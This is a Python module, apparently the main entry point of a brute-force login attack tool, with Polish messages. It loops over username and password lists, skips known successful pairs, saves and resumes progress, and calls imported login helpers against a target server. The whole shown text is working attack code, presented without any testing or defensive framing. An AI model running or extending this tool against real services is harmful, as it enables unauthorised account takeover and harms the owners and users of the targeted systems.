from utils.brute_utils import create_session, check_server, try_login
from utils.files_utils import check_and_load_known_success, check_and_load_progress, load_usernames_and_passwords, save_to_file
from settings import PROGRESS_FILE

def check_all_and_run_brute_force():
    """Główna funkcja do sprawdzenia serwera i uruchomienia ataku brute-force."""
    session = create_session()

    known_success = check_and_load_known_success()
    last_combo = check_and_load_progress()
    
    resume = last_combo is None

    usernames, passwords = load_usernames_and_passwords()

    if not check_server(session):
        print("[!] Serwer jest niedostępny. Kończę.")
        exit(1)
    else:
        print("[*] Serwer jest dostępny. Rozpoczynam atak.")

    for username in usernames:
        for password in passwords:
            try:
                combo = f"{username}:{password}"
                if combo in known_success:
                    continue
                if not resume:
                    if combo == last_combo:
                        resume = True
                    continue
                print(f"[*] Próba: {combo}")
                save_to_file(PROGRESS_FILE, combo)  
            except KeyboardInterrupt:
                print("\n[!] Przerwano przez użytkownika. Zapisuję postęp i kończę.")
                save_to_file(PROGRESS_FILE, combo)
                exit(0)
            except Exception as e:
                print(f"[!] Wystąpił błąd: {e}. Kontynuuję...")
                continue
            
            try_login(session, known_success, username, password)